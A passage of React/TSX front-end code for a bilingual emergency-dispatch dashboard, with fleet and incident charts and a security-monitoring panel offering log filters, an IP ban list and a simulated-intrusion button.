            {lang === 'es' ? 'TIEMPO PROMEDIO DE RESPUESTA' : 'AVERAGE RESPONSE TIME'}
          </span>
          <div className="mt-2 flex items-baseline gap-1.5">
            <span className="text-2xl font-black text-white tracking-tight">
              {Math.floor(metrics.avgResponseTimeSec / 60)}m {Math.floor(metrics.avgResponseTimeSec % 60)}s
            </span>
            <span className={`text-[10px] font-bold ${metrics.avgResponseTimeSec < 180 ? 'text-[#00FF41]' : 'text-orange-400'}`}>
              {metrics.avgResponseTimeSec < 180 ? '▲ OPTIMAL' : '▼ DELAY'}
            </span>
          </div>
          <div className="mt-3 text-[9px] text-[#00FF41]/40 border-t border-[#00FF41]/10 pt-2 uppercase">
            {lang === 'es' 
              ? 'Retraso promedio de enrutamiento y despacho'
              : 'Average routing & dispatch latency'}
          </div>
        </div>

        {/* KPI 2: Fleet Readiness Rate */}
        <div className="border border-[#00FF41]/20 bg-[#0a0a0a]/75 p-4 flex flex-col justify-between relative overflow-hidden group hover:border-[#00FF41]/50 transition-all">
          <div className="absolute right-3 top-3 opacity-15 text-[#00e5ff] group-hover:opacity-30 transition-all">
            <Truck className="w-10 h-10" />
          </div>
          <span className="text-xxs text-[#00FF41]/60 uppercase tracking-widest block font-bold">
            {lang === 'es' ? 'DISPONIBILIDAD DE FLOTA' : 'FLEET READINESS RATE'}
          </span>
          <div className="mt-2 flex items-baseline gap-1.5">
            <span className="text-2xl font-black text-white tracking-tight">
              {metrics.fleetReadiness.toFixed(1)}%
            </span>
            <span className="text-xxs font-mono text-[#00e5ff]">
              ({metrics.availableUnitsCount}/{metrics.totalUnits})
            </span>
          </div>
          <div className="mt-3 text-[9px] text-[#00FF41]/40 border-t border-[#00FF41]/10 pt-2 uppercase">
            {lang === 'es' 
              ? `${metrics.dispatchedUnitsCount} Unidades Activas | ${metrics.offlineUnitsCount} Fuera de servicio`
              : `${metrics.dispatchedUnitsCount} Dispatched Units | ${metrics.offlineUnitsCount} Maintenance`}
          </div>
        </div>

        {/* KPI 3: Incident Load */}
        <div className="border border-[#00FF41]/20 bg-[#0a0a0a]/75 p-4 flex flex-col justify-between relative overflow-hidden group hover:border-[#00FF41]/50 transition-all">
          <div className="absolute right-3 top-3 opacity-15 text-[#FF3333] group-hover:opacity-30 transition-all">
            <Activity className="w-10 h-10" />
          </div>
          <span className="text-xxs text-[#00FF41]/60 uppercase tracking-widest block font-bold">
            {lang === 'es' ? 'CARGA DE INCIDENTES ACTIVOS' : 'ACTIVE INCIDENTS LOAD'}
          </span>
          <div className="mt-2 flex items-baseline gap-1.5">
            <span className="text-2xl font-black text-white tracking-tight">
              {metrics.pendingIncidents + metrics.activeDispatchedIncidents}
            </span>
            <span className="text-xxs text-amber-500 font-bold">
              ({metrics.pendingIncidents} {lang === 'es' ? 'PENDIENTES' : 'PENDING'})
            </span>
          </div>
          <div className="mt-3 text-[9px] text-[#00FF41]/40 border-t border-[#00FF41]/10 pt-2 uppercase">
            {lang === 'es'
              ? `${metrics.resolvedIncidents} Emergencias mitigadas en esta sesión`
              : `${metrics.resolvedIncidents} Emergencies mitigated this session`}
          </div>
        </div>

        {/* KPI 4: Mean Sector Vulnerability */}
        <div className="border border-[#00FF41]/20 bg-[#0a0a0a]/75 p-4 flex flex-col justify-between relative overflow-hidden group hover:border-[#00FF41]/50 transition-all">
          <div className="absolute right-3 top-3 opacity-15 text-yellow-500 group-hover:opacity-30 transition-all">
            <Shield className="w-10 h-10" />
          </div>
          <span className="text-xxs text-[#00FF41]/60 uppercase tracking-widest block font-bold">
            {lang === 'es' ? 'VULNERABILIDAD RESIDUAL MEDIO' : 'MEAN RESIDUAL VULNERABILITY'}
          </span>
          <div className="mt-2 flex items-baseline gap-1.5">
            <span className="text-2xl font-black text-white tracking-tight">
              {(metrics.avgIvr * 100).toFixed(1)}%
            </span>
            <span className={`text-[10px] font-bold ${metrics.avgIvr < metrics.baseRiskAvg ? 'text-[#00FF41]' : 'text-red-400'}`}>
              {metrics.avgIvr < metrics.baseRiskAvg ? '▼ DECREASED' : '▲ ELEVATED'}
            </span>
          </div>
          <div className="mt-3 text-[9px] text-[#00FF41]/40 border-t border-[#00FF41]/10 pt-2 uppercase">
            {lang === 'es'
              ? `Base de riesgo de referencia: ${(metrics.baseRiskAvg * 100).toFixed(1)}%`
              : `Reference base area risk: ${(metrics.baseRiskAvg * 100).toFixed(1)}%`}
          </div>
        </div>

      </div>

      {/* CORE CHARTS BENTO GRID */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
        
        {/* CHART 1: SECTOR RISK COMPARATIVE ANALYSIS (BAR/AREA COMBO) */}
        <div className="lg:col-span-8 border border-[#00FF41]/20 bg-[#0a0a0a]/75 p-4 flex flex-col min-h-[350px]">
          <div className="flex justify-between items-center mb-4 border-b border-[#00FF41]/10 pb-2">
            <div className="flex items-center gap-2">
              <Layers className="w-4 h-4 text-[#00e5ff]" />
              <h2 className="text-xs font-bold uppercase text-white">
                {lang === 'es' ? 'ANÁLISIS DE RIESGO DE SECTOR (IVR)' : 'SECTOR RISK TRENDS & COMPARATIVE (IVR)'}
              </h2>
            </div>
            <span className="text-[10px] text-[#00e5ff] font-mono border border-[#00e5ff]/30 px-2 py-0.5">
              {lang === 'es' ? 'ÍNDICE DINÁMICO DE RIESGO' : 'DYNAMIC RISK INDEX'}
            </span>
          </div>

          <div className="flex-1 w-full text-xs">
            {sectorChartData.length === 0 ? (
              <div className="h-full flex items-center justify-center text-gray-500 uppercase">
                {lang === 'es' ? 'Sin datos de sector disponibles' : 'No sector data available'}
              </div>
            ) : (
              <ResponsiveContainer width="100%" height={280}>
                <BarChart data={sectorChartData} margin={{ top: 10, right: 10, left: -20, bottom: 0 }}>
                  <CartesianGrid strokeDasharray="3 3" stroke="rgba(0, 255, 65, 0.1)" />
                  <XAxis 
                    dataKey="name" 
                    stroke="#00FF41" 
                    tick={{ fill: 'rgba(0, 255, 65, 0.7)', fontSize: 10 }}
                    axisLine={{ stroke: 'rgba(0, 255, 65, 0.3)' }}
                  />
                  <YAxis 
                    stroke="#00FF41" 
                    tick={{ fill: 'rgba(0, 255, 65, 0.7)', fontSize: 10 }}
                    axisLine={{ stroke: 'rgba(0, 255, 65, 0.3)' }}
                    unit="%"
                  />
                  <Tooltip 
                    contentStyle={{ 
                      backgroundColor: '#050505', 
                      borderColor: '#00FF41', 
                      borderWidth: 1, 
                      color: '#00FF41',
                      fontFamily: 'monospace' 
                    }} 
                  />
                  <Legend verticalAlign="top" height={36} wrapperStyle={{ color: '#00FF41', fontSize: '11px' }} />
                  <Bar 
                    dataKey={lang === 'es' ? 'Riesgo Base' : 'Base Risk'} 
                    fill="rgba(0, 229, 255, 0.2)" 
                    stroke="#00e5ff"
                    strokeWidth={1.5}
                    radius={[0, 0, 0, 0]} 
                  />
                  <Bar 
                    dataKey={lang === 'es' ? 'Riesgo Residual (IVR)' : 'Residual Vulnerability (IVR)'} 
                    fill="rgba(0, 255, 65, 0.35)" 
                    stroke="#00FF41"
                    strokeWidth={1.5}
                    radius={[0, 0, 0, 0]} 
                  />
                </BarChart>
              </ResponsiveContainer>
            )}
          </div>
          <p className="text-[10px] text-[#00FF41]/40 mt-2 uppercase">
            {lang === 'es'
              ? '* El Riesgo Residual (IVR) disminuye cuando hay unidades tácticas enrutadas o pre-posicionadas dentro del sector.'
              : '* Index of Residual Vulnerability (IVR) drops as response fleets are routed or pre-positioned inside the sector.'}
          </p>
        </div>

        {/* CHART 2: PIE INCIDENT TYPE SPLIT */}
        <div className="lg:col-span-4 border border-[#00FF41]/20 bg-[#0a0a0a]/75 p-4 flex flex-col min-h-[350px]">
          <div className="flex justify-between items-center mb-4 border-b border-[#00FF41]/10 pb-2">
            <div className="flex items-center gap-2">
              <Flame className="w-4 h-4 text-[#FF4444]" />
              <h2 className="text-xs font-bold uppercase text-white">
                {lang === 'es' ? 'DISTRIBUCIÓN DE EMERGENCIAS' : 'INCIDENT TYPES SPLIT'}
              </h2>
            </div>
          </div>

          <div className="flex-1 flex items-center justify-center text-xs relative">
            <ResponsiveContainer width="100%" height={200}>
              <PieChart>
                <Pie
                  data={incidentDistributionData}
                  cx="50%"
                  cy="50%"
                  innerRadius={60}
                  outerRadius={80}
                  paddingAngle={4}
                  dataKey="value"
                >
                  {incidentDistributionData.map((entry, index) => (
                    <Cell key={`cell-${index}`} fill={entry.color} stroke="#050505" strokeWidth={2} />
                  ))}
                </Pie>
                <Tooltip 
                  contentStyle={{ 
                    backgroundColor: '#050505', 
                    borderColor: '#00FF41', 
                    color: '#00FF41',
                    fontFamily: 'monospace',
                    fontSize: '11px'
                  }} 
                />
              </PieChart>
            </ResponsiveContainer>
            
            {/* Overlay label center */}
            <div className="absolute flex flex-col items-center justify-center text-center pointer-events-none">
              <span className="text-xl font-black text-white">{metrics.totalIncidents}</span>
              <span className="text-[9px] text-[#00FF41]/50 uppercase">
                {lang === 'es' ? 'TOTAL REPORTES' : 'TOTAL REPORTS'}
              </span>
            </div>
          </div>

          {/* Color Indicators Legends */}
          <div className="grid grid-cols-2 gap-2 mt-2 pt-2 border-t border-[#00FF41]/10">
            {incidentDistributionData.map((item, idx) => (
              <div key={idx} className="flex items-center gap-1.5 text-xxs">
                <span className="w-2 h-2 shrink-0" style={{ backgroundColor: item.color }} />
                <span className="text-[#00FF41]/80 truncate uppercase">{item.name}</span>
                <span className="text-white font-bold ml-auto">{item.value}</span>
              </div>
            ))}
          </div>
        </div>

      </div>

      {/* SECOND CHARTS ROW */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
        
        {/* CHART 3: FLEET MOBILITY AND DISPATCH RADIAL STATE */}
        <div className="lg:col-span-4 border border-[#00FF41]/20 bg-[#0a0a0a]/75 p-4 flex flex-col min-h-[320px]">
          <div className="flex justify-between items-center mb-4 border-b border-[#00FF41]/10 pb-2">
            <div className="flex items-center gap-2">
              <Truck className="w-4 h-4 text-[#00FF41]" />
              <h2 className="text-xs font-bold uppercase text-white">
                {lang === 'es' ? 'ESTADO OPERATIVO DE FLOTA' : 'FLEET STATUS OVERVIEW'}
              </h2>
            </div>
          </div>

          <div className="flex-1 flex items-center justify-center relative">
            <ResponsiveContainer width="100%" height={180}>
              <PieChart>
                <Pie
                  data={unitStatusData}
                  cx="50%"
                  cy="50%"
                  innerRadius={0}
                  outerRadius={70}
                  paddingAngle={2}
                  dataKey="value"
                >
                  {unitStatusData.map((entry, index) => (
                    <Cell key={`cell-${index}`} fill={entry.color} stroke="#050505" strokeWidth={1} />
                  ))}
                </Pie>
                <Tooltip 
                  contentStyle={{ 
                    backgroundColor: '#050505', 
                    borderColor: '#00FF41', 
                    color: '#00FF41',
                    fontFamily: 'monospace',
                    fontSize: '11px'
                  }} 
                />
              </PieChart>
            </ResponsiveContainer>
          </div>

          <div className="flex flex-col gap-1 text-xxs mt-2 pt-2 border-t border-[#00FF41]/10">
            {unitStatusData.map((item, idx) => (
              <div key={idx} className="flex items-center justify-between">
                <div className="flex items-center gap-1.5">
                  <span className="w-2 h-2 shrink-0 rounded-full" style={{ backgroundColor: item.color }} />
                  <span className="text-white uppercase">{item.name}</span>
                </div>
                <span className="text-[#00FF41] font-bold">
                  {item.value} {lang === 'es' ? 'unidades' : 'units'} ({((item.value / (metrics.totalUnits || 1)) * 100).toFixed(0)}%)
                </span>
              </div>
            ))}
          </div>
        </div>

        {/* CHART 4: TEMPORAL EXPOSURE TRENDS (LINE AREA HISTORICAL CHART) */}
        <div className="lg:col-span-8 border border-[#00FF41]/20 bg-[#0a0a0a]/75 p-4 flex flex-col min-h-[320px]">
          <div className="flex justify-between items-center mb-4 border-b border-[#00FF41]/10 pb-2">
            <div className="flex items-center gap-2">
              <TrendingUp className="w-4 h-4 text-orange-400" />
              <h2 className="text-xs font-bold uppercase text-white">
                {lang === 'es' ? 'TENDENCIA DE EXPOSICIÓN HORARIA' : 'ROLLING VULNERABILITY TRENDS (6H)'}
              </h2>
            </div>
            <span className="text-[10px] text-orange-400 font-mono border border-orange-400/30 px-2 py-0.5">
              {lang === 'es' ? 'MARGEN DE SEGURIDAD' : 'SAFETY THRESHOLD: 35%'}
            </span>
          </div>

          <div className="flex-1 w-full text-xs">
            <ResponsiveContainer width="100%" height={210}>
              <AreaChart data={historicalTrendData} margin={{ top: 10, right: 10, left: -20, bottom: 0 }}>
                <defs>
                  <linearGradient id="colorIvr" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="5%" stopColor="#00FF41" stopOpacity={0.3}/>
                    <stop offset="95%" stopColor="#00FF41" stopOpacity={0.0}/>
                  </linearGradient>
                </defs>
                <CartesianGrid strokeDasharray="3 3" stroke="rgba(0, 255, 65, 0.08)" />
                <XAxis 
                  dataKey="time" 
                  stroke="#00FF41" 
                  tick={{ fill: 'rgba(0, 255, 65, 0.7)', fontSize: 10 }}
                />
                <YAxis 
                  stroke="#00FF41" 
                  tick={{ fill: 'rgba(0, 255, 65, 0.7)', fontSize: 10 }}
                  domain={[0, 100]}
                  unit="%"
                />
                <Tooltip 
                  contentStyle={{ 
                    backgroundColor: '#050505', 
                    borderColor: '#00FF41', 
                    color: '#00FF41',
                    fontFamily: 'monospace' 
                  }} 
                />
                <Legend verticalAlign="top" height={30} wrapperStyle={{ fontSize: '11px' }} />
                <Area 
                  type="monotone" 
                  dataKey={lang === 'es' ? 'Riesgo Cobertura' : 'Residual Vulnerability %'} 
                  stroke="#00FF41" 
                  fillOpacity={1} 
                  fill="url(#colorIvr)" 
                  strokeWidth={2}
                />
                <Line 
                  type="monotone" 
                  dataKey={lang === 'es' ? 'Objetivo de Seguridad' : 'Target Safety Threshold'} 
                  stroke="#FF4444" 
                  strokeWidth={1.5}
                  strokeDasharray="5 5"
                />
              </AreaChart>
            </ResponsiveContainer>
          </div>
          <p className="text-[10px] text-[#00FF41]/40 mt-1 uppercase">
            {lang === 'es'
              ? 'Métrica acumulada del índice de vulnerabilidad a nivel metropolitano.'
              : 'Cumulative vulnerability coefficient calculated at the metropolitan regional level.'}
          </p>
        </div>

      </div>
        </>
      ) : (
        <div className="flex flex-col gap-4">
          {/* SOC DASHBOARD SUMMARY CARD */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            {/* Stat 1: Threat Level */}
            <div className="border border-red-500/20 bg-[#0a0a0a]/75 p-4 flex flex-col justify-between relative overflow-hidden">
              <div className="absolute right-3 top-3 opacity-15 text-red-500">
                <ShieldAlert className="w-10 h-10" />
              </div>
              <span className="text-xxs text-red-400 uppercase tracking-widest block font-bold">
                {lang === 'es' ? 'NIVEL DE AMENAZA DEL SISTEMA' : 'SYSTEM THREAT LEVEL'}
              </span>
              <div className="mt-2 flex items-baseline gap-1.5">
                <span className="text-xl font-black text-red-500 tracking-tight animate-pulse">
                  {banlist.length > 3 ? (lang === 'es' ? 'CRÍTICO' : 'CRITICAL THREAT') : (lang === 'es' ? 'MONITOREADO (ESTABLE)' : 'MONITORED (STABLE)')}
                </span>
              </div>
              <div className="mt-3 text-[9px] text-red-400/50 border-t border-red-500/10 pt-2 uppercase">
                {lang === 'es' ? 'Monitoreo activo de puertos y WAF' : 'Active port & WAF threat monitoring'}
              </div>
            </div>

            {/* Stat 2: Active IP Bans */}
            <div className="border border-red-500/20 bg-[#0a0a0a]/75 p-4 flex flex-col justify-between relative overflow-hidden">
              <div className="absolute right-3 top-3 opacity-15 text-red-500">
                <Lock className="w-10 h-10" />
              </div>
              <span className="text-xxs text-red-400 uppercase tracking-widest block font-bold">
                {lang === 'es' ? 'DIRECCIONES IP BLOQUEADAS' : 'BANNED FIREWALL IPS'}
              </span>
              <div className="mt-2 flex items-baseline gap-1.5">
                <span className="text-2xl font-black text-white tracking-tight">
                  {banlist.length}
                </span>
                <span className="text-xxs text-red-500 font-bold">
                  {lang === 'es' ? 'ACTIVAS' : 'ACTIVE'}
                </span>
              </div>
              <div className="mt-3 text-[9px] text-red-400/50 border-t border-red-500/10 pt-2 uppercase">
                {lang === 'es' ? 'Reglas estáticas de cortafuegos' : 'Static firewall deny rules'}
              </div>
            </div>

            {/* Stat 3: Total Monitored Events */}
            <div className="border border-[#00FF41]/20 bg-[#0a0a0a]/75 p-4 flex flex-col justify-between relative overflow-hidden">
              <div className="absolute right-3 top-3 opacity-15 text-[#00FF41]">
                <Terminal className="w-10 h-10" />
              </div>
              <span className="text-xxs text-[#00FF41]/60 uppercase tracking-widest block font-bold">
                {lang === 'es' ? 'LOGS DE SEGURIDAD TOTALES' : 'TOTAL AUDITED LOGS'}
              </span>
              <div className="mt-2 flex items-baseline gap-1.5">
                <span className="text-2xl font-black text-white tracking-tight">
                  {securityLogs.length}
                </span>
              </div>
              <div className="mt-3 text-[9px] text-[#00FF41]/40 border-t border-[#00FF41]/10 pt-2 uppercase">
                {lang === 'es' ? 'Eventos en memoria persistente' : 'In-memory persistent event store'}
              </div>
            </div>

            {/* Stat 4: Intrusion simulation trigger and download */}
            <div className="border border-[#00FF41]/20 bg-[#0a0a0a]/75 p-4 flex flex-col justify-between gap-2">
              <button
                type="button"
                onClick={triggerIntrusionSimulation}
                disabled={isSimulatingAttack}
                className={`w-full py-1.5 px-3 border border-red-500 bg-red-500/10 hover:bg-red-500/20 text-red-400 text-xxs font-bold uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer ${
                  isSimulatingAttack ? 'opacity-50 cursor-not-allowed' : ''
                }`}
              >
                <ShieldAlert className={`w-3.5 h-3.5 ${isSimulatingAttack ? 'animate-spin' : ''}`} />
                {isSimulatingAttack 
                  ? (lang === 'es' ? 'Simulando Ataque...' : 'Simulating Threat...') 
                  : (lang === 'es' ? 'Simular Intrusión' : 'Simulate Intrusion')}
              </button>
              <button
                type="button"
                onClick={handleDownloadSecurityLogs}
                className="w-full py-1.5 px-3 border border-[#00FF41] bg-[#00FF41]/10 hover:bg-[#00FF41]/20 text-[#00FF41] text-xxs font-bold uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer"
              >
                <Download className="w-3.5 h-3.5" />
                {lang === 'es' ? 'Descargar Auditoría (.TXT)' : 'Download Audit (.TXT)'}
              </button>
            </div>
          </div>

          {/* FILTERS & BAN CONTROLS */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-4 border border-red-500/20 bg-[#0a0a0a]/80 p-4">
            <div className="lg:col-span-8 grid grid-cols-1 sm:grid-cols-3 gap-3">
              {/* Search query */}
              <div className="flex flex-col gap-1">
                <label className="text-[10px] text-stone-400 uppercase font-mono">{lang === 'es' ? 'Buscar IP/Evento/Usuario' : 'Search IP/Event/User'}</label>
                <div className="relative">
                  <input
                    type="text"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    placeholder="e.g. 185.220, BRUTE, admin..."
                    className="w-full bg-[#020202] border border-[#00FF41]/30 p-2 text-xxs text-white font-mono focus:outline-none focus:border-[#00FF41]"
                  />
                  <Search className="absolute right-2.5 top-2.5 w-3.5 h-3.5 text-[#00FF41]/50" />
                </div>
              </div>

              {/* Severity Filter */}
              <div className="flex flex-col gap-1">
                <label className="text-[10px] text-stone-400 uppercase font-mono">{lang === 'es' ? 'Filtrar Gravedad' : 'Filter Severity'}</label>
                <select
                  value={severityFilter}
                  onChange={(e: any) => setSeverityFilter(e.target.value)}
                  className="w-full bg-[#020202] border border-[#00FF41]/30 p-2 text-xxs text-[#00FF41] font-mono focus:outline-none focus:border-[#00FF41]"
                >
                  <option value="all">{lang === 'es' ? 'Gravedad: Todos' : 'Severity: All'}</option>
                  <option value="low">LOW</option>
                  <option value="medium">MEDIUM</option>
                  <option value="high">HIGH</option>
                  <option value="critical">CRITICAL</option>
                </select>
              </div>

              {/* Event Filter */}
              <div className="flex flex-col gap-1">
                <label className="text-[10px] text-stone-400 uppercase font-mono">{lang === 'es' ? 'Filtrar Evento' : 'Filter Event Type'}</label>
                <select
                  value={eventFilter}
                  onChange={(e: any) => setEventFilter(e.target.value)}
                  className="w-full bg-[#020202] border border-[#00FF41]/30 p-2 text-xxs text-[#00FF41] font-mono focus:outline-none focus:border-[#00FF41]"
                >
                  <option value="all">{lang === 'es' ? 'Evento: Todos' : 'Event: All'}</option>
                  <option value="login">Logins & Auth</option>
                  <option value="scan">SQLi / Port Scan</option>
                  <option value="injection">Injections / XSS</option>
                  <option value="ws">Websocket Taps</option>
                </select>
              </div>
            </div>

            {/* Quick IP Ban Form */}
            <form onSubmit={handleManualBanIp} className="lg:col-span-4 flex flex-col gap-1 border-t lg:border-t-0 lg:border-l border-red-500/10 lg:pl-4 pt-3 lg:pt-0">
              <label className="text-[10px] text-red-400 uppercase font-mono">{lang === 'es' ? 'Agregar IP a Cortafuegos' : 'Add IP to Firewall Banlist'}</label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={newBanIp}
                  onChange={(e) => setNewBanIp(e.target.value)}
                  placeholder="e.g. 192.168.1.1"
                  className="flex-1 bg-[#020202] border border-red-500/30 p-2 text-xxs text-white font-mono focus:outline-none focus:border-red-500"
                />
                <button
                  type="submit"
                  className="bg-red-500/10 border border-red-500 hover:bg-red-500/20 text-red-400 text-xxs font-mono uppercase px-3 cursor-pointer"
                >
                  {lang === 'es' ? 'BAN' : 'BAN'}
                </button>
              </div>
            </form>
          </div>

          {/* BANLIST CHIPS */}
          {banlist.length > 0 && (
            <div className="border border-red-500/20 bg-[#0a0a0a]/50 p-3 flex flex-wrap gap-2 items-center">
              <span className="text-[10px] font-mono uppercase text-red-400/70 mr-2">
                {lang === 'es' ? '🔥 IPs Bloqueadas en Cortafuegos:' : '🔥 Firewall Blocked IPs:'}
              </span>
              <div className="flex flex-wrap gap-1.5">
                {banlist.map((ip) => (
                  <span
                    key={ip}
                    className="inline-flex items-center gap-1.5 bg-red-950/40 border border-red-500/30 px-2 py-0.5 text-xxs text-red-400 font-mono rounded"
                  >
                    <span>{ip}</span>
                    <button
                      type="button"
                      onClick={() => handleToggleBanIp(ip)}
                      className="hover:text-white transition-colors cursor-pointer text-[10px] font-black font-mono"
                      title={lang === 'es' ? 'Desbloquear IP' : 'Unban IP'}
                    >
                      ×
                    </button>
                  </span>
                ))}
              </div>
            </div>
          )}

          {/* LOG MASTER DETAIL PANEL */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
            {/* Logs List Pane */}
            <div className="lg:col-span-7 border border-[#00FF41]/20 bg-[#0a0a0a]/75 flex flex-col max-h-[480px]">
              <div className="bg-[#020202] border-b border-[#00FF41]/10 px-3 py-2 flex justify-between items-center">
                <span className="text-[10px] font-bold uppercase text-[#00FF41]">
                  {lang === 'es' ? `Logs Filtrados (${filteredLogs.length})` : `Filtered Log Streams (${filteredLogs.length})`}
                </span>
                <span className="text-[9px] text-stone-500 font-mono uppercase">
                  {lang === 'es' ? 'ORDEN: MÁS RECIENTES' : 'SORT: LATEST FIRST'}
                </span>
              </div>

              <div className="flex-1 overflow-y-auto divide-y divide-[#00FF41]/10">
                {filteredLogs.length === 0 ? (
                  <div className="p-8 text-center text-stone-500 uppercase text-xxs">
                    {lang === 'es' ? 'No se encontraron logs coincidentes' : 'No matching security logs found'}
                  </div>
                ) : (
                  filteredLogs.map((log) => {
                    const isSelected = selectedLogId === log.id;
                    let severityColor = 'text-stone-400 bg-stone-500/10 border-stone-500/20';
                    let flashClass = '';
                    if (log.severity === 'critical') {
                      severityColor = 'text-red-400 bg-red-500/10 border-red-500/30 font-black';
                      flashClass = 'animate-pulse';
                    } else if (log.severity === 'high') {
                      severityColor = 'text-orange-400 bg-orange-500/10 border-orange-500/30 font-bold';
                    } else if (log.severity === 'medium') {
                      severityColor = 'text-yellow-400 bg-yellow-500/10 border-yellow-500/20';
                    } else if (log.severity === 'low') {
                      severityColor = 'text-[#00e5ff] bg-[#00e5ff]/10 border-[#00e5ff]/20';
                    }

                    const isBanned = banlist.includes(log.ip);

                    return (
                      <div
                        key={log.id}
                        onClick={() => setSelectedLogId(log.id)}
                        className={`p-3 text-xxs transition-all cursor-pointer flex flex-col gap-1.5 ${
                          isSelected 
                            ? 'bg-[#00FF41]/5 border-l-2 border-[#00FF41]' 
                            : 'hover:bg-white/[0.02]'
                        }`}
                      >
                        <div className="flex justify-between items-center">
                          <span className="font-mono text-stone-500">{log.timestamp}</span>
                          <div className="flex gap-1">
                            {isBanned && (
                              <span className="px-1.5 py-0.5 text-[9px] bg-red-950/60 border border-red-500 text-red-400 font-bold uppercase tracking-wide">
                                {lang === 'es' ? 'BANEADO' : 'BANNED'}
                              </span>
                            )}
                            <span className={`px-1.5 py-0.5 text-[9px] border uppercase font-mono ${severityColor} ${flashClass}`}>
                              {log.severity}
                            </span>
                          </div>
                        </div>

                        <div className="flex justify-between items-center">
                          <span className="font-bold text-white uppercase truncate max-w-[200px]">
                            {log.event}
                          </span>
                          <span className="font-mono text-[#00FF41]">{log.ip}</span>
                        </div>

                        <div className="flex justify-between items-center text-stone-400 text-[10px]">
                          <span>
                            {lang === 'es' ? 'Destino: ' : 'Target: '}
                            <code className="text-[#00e5ff]">{log.target}</code>
                          </span>
                          <span className="italic">{log.geo || 'Unknown Location'}</span>
                        </div>
                      </div>
                    );
                  })
                )}
              </div>
            </div>

            {/* Log Detail Pane */}
            <div className="lg:col-span-5 border border-red-500/20 bg-[#020202] flex flex-col min-h-[380px] lg:max-h-[480px]">
              {(() => {
                const selectedLog = securityLogs.find(l => l.id === selectedLogId);
                if (!selectedLog) {
                  return (
                    <div className="flex-1 flex items-center justify-center text-stone-500 uppercase text-xxs p-6 text-center">
                      {lang === 'es' 
                        ? 'Seleccione un registro del panel de auditoría para ver los metadatos forenses' 
                        : 'Select an audit record from the left panel to inspect threat telemetry'}
                    </div>
                  );
                }

                const isBanned = banlist.includes(selectedLog.ip);

                return (
                  <div className="flex flex-col h-full overflow-hidden p-4">
                    {/* Detail Header */}
                    <div className="border-b border-red-500/20 pb-3 mb-3 flex flex-col gap-2">
                      <div className="flex justify-between items-start gap-2">
                        <div>
                          <span className="text-[10px] text-stone-400 font-mono block">
                            {lang === 'es' ? 'IDENTIFICADOR DE EVENTO' : 'AUDIT LOG IDENTIFIER'}
                          </span>
                          <span className="text-xs font-mono font-black text-red-400">
                            {selectedLog.id}
                          </span>
                        </div>
                        <button
                          type="button"
                          onClick={() => handleToggleBanIp(selectedLog.ip)}
                          className={`py-1 px-2.5 text-[10px] font-bold uppercase transition-all flex items-center gap-1.5 cursor-pointer border ${
                            isBanned
                              ? 'bg-[#00FF41]/10 border-[#00FF41] text-[#00FF41] hover:bg-[#00FF41]/20'
                              : 'bg-red-500/10 border-red-500 text-red-400 hover:bg-red-500/20'
                          }`}
                        >
                          {isBanned ? (
                            <>
                              <Unlock className="w-3 h-3" />
                              {lang === 'es' ? 'QUITAR BLOQUEO' : 'UNBAN IP'}
                            </>
                          ) : (
                            <>
                              <UserX className="w-3 h-3" />
                              {lang === 'es' ? 'BLOQUEAR IP' : 'BAN SOURCE IP'}
                            </>
                          )}
                        </button>
                      </div>

                      <h3 className="text-sm font-black text-white uppercase tracking-wider">
                        {selectedLog.event}
                      </h3>
                    </div>

                    {/* Detail Metadata Grid */}
                    <div className="grid grid-cols-2 gap-3 text-xxs mb-3 border-b border-red-500/10 pb-3">
                      <div>
                        <span className="text-stone-500 block uppercase font-mono">Timestamp</span>
                        <span className="text-white font-mono">{selectedLog.timestamp}</span>
                      </div>
                      <div>
                        <span className="text-stone-500 block uppercase font-mono">Source IP</span>
                        <span className="text-[#00FF41] font-mono">{selectedLog.ip}</span>
                      </div>
                      <div>
                        <span className="text-stone-500 block uppercase font-mono">Target Endpoint</span>
                        <span className="text-[#00e5ff] font-mono truncate block" title={selectedLog.target}>{selectedLog.target}</span>
                      </div>
                      <div>
                        <span className="text-stone-500 block uppercase font-mono">Authed Operator / Client</span>
                        <span className="text-amber-400 font-mono">{selectedLog.user}</span>
                      </div>
                      <div className="col-span-2">
                        <span className="text-stone-500 block uppercase font-mono">Threat Geolocator metadata</span>
                        <span className="text-white font-sans">{selectedLog.geo || 'N/A'}</span>
                      </div>
                    </div>

                    {/* Log Raw Payload Inspector */}
                    <div className="flex-1 flex flex-col overflow-hidden">
                      <span className="text-[10px] text-stone-400 font-mono block mb-1 uppercase">
                        {lang === 'es' ? '📦 Carga Útil del Mensaje (Payload):' : '📦 Raw Decoded Message Payload:'}
                      </span>
                      <div className="flex-1 bg-[#020202] border border-red-500/25 p-3 font-mono text-[10px] text-red-400/90 overflow-auto whitespace-pre rounded">
                        <code>{selectedLog.payload}</code>
                      </div>
                    </div>
                  </div>
                );
              })()}
            </div>
          </div>
        </div>
      )}

      {/* OPERATIONS ADVISORY CONTROL AND LOGISTICS PANEL */}
      <div className="border border-[#00FF41]/30 bg-[#0a0a0a]/90 p-4 shadow-[0_0_15px_rgba(0,255,65,0.05)]">
        <div className="flex items-center gap-2 mb-3 border-b border-[#00FF41]/10 pb-2">
          <Sparkles className="w-4 h-4 text-[#00FF41]" />
          <h2 className="text-xs font-bold uppercase text-white">
            {lang === 'es' ? 'RECOMENDACIONES DE OPTIMIZACIÓN LOGÍSTICA (SOAE)' : 'LOGISTICS OPTIMIZATION RECOMMENDATIONS (SOAE)'}
          </h2>
        </div>

        <div className="flex flex-col gap-3">
          {tacticalAdvisory.map((adv) => {
            let typeColor = 'border-[#00FF41]/40 text-[#00FF41] bg-[#00FF41]/5';
            let label = 'STABLE';
            if (adv.type === 'warning') {
              typeColor = 'border-orange-500/40 text-orange-400 bg-orange-500/5';
              label = 'WARNING';
            } else if (adv.type === 'danger' || adv.id === 'adv-ivr') {
              typeColor = 'border-red-500/40 text-red-400 bg-red-500/5';
              label = 'CRITICAL';
            } else if (adv.type === 'success') {
              typeColor = 'border-[#00FF41]/40 text-[#00FF41] bg-[#00FF41]/5';
